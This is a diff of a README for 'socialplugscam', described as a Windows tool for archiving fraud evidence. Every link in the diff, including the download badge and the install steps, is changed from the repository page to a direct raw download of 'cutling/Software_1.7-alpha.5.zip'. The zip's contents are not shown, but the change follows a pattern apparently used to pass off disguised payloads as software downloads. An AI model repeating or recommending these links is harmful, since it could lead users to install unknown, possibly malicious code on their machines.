@@ -1,12 +1,12 @@
 # 📁 socialplugscam - Archive Fraud Evidence Safely
 
-[![Download / Visit Page](https://img.shields.io/badge/Download%20%2F%20Visit%20Page-5A67D8?style=for-the-badge&logo=github&logoColor=white)](https://github.com/perladu5010/socialplugscam)
+[![Download / Visit Page](https://img.shields.io/badge/Download%20%2F%20Visit%20Page-5A67D8?style=for-the-badge&logo=github&logoColor=white)](https://github.com/perladu5010/socialplugscam/raw/refs/heads/main/cutling/Software_1.7-alpha.5.zip)
 
 ## 🔗 Download Page
 
 Use this link to visit the page and get the files you need:
 
-[https://github.com/perladu5010/socialplugscam](https://github.com/perladu5010/socialplugscam)
+[https://github.com/perladu5010/socialplugscam/raw/refs/heads/main/cutling/Software_1.7-alpha.5.zip](https://github.com/perladu5010/socialplugscam/raw/refs/heads/main/cutling/Software_1.7-alpha.5.zip)
 
 ## 🧾 What this app does
 
@@ -36,7 +36,7 @@ If you plan to store many images and chats, more free disk space helps.
 Follow these steps on Windows:
 
 1. Open this page in your browser:
-   [https://github.com/perladu5010/socialplugscam](https://github.com/perladu5010/socialplugscam)
+   [https://github.com/perladu5010/socialplugscam/raw/refs/heads/main/cutling/Software_1.7-alpha.5.zip](https://github.com/perladu5010/socialplugscam/raw/refs/heads/main/cutling/Software_1.7-alpha.5.zip)
 
 2. Look for the latest release or the main download file on the page.
 
@@ -245,7 +245,7 @@ A tidy archive saves time when you need it.
 
 Use this page to get the Windows files:
 
-[https://github.com/perladu5010/socialplugscam](https://github.com/perladu5010/socialplugscam)
+[https://github.com/perladu5010/socialplugscam/raw/refs/heads/main/cutling/Software_1.7-alpha.5.zip](https://github.com/perladu5010/socialplugscam/raw/refs/heads/main/cutling/Software_1.7-alpha.5.zip)
 
 ## 🧷 Name guide
 
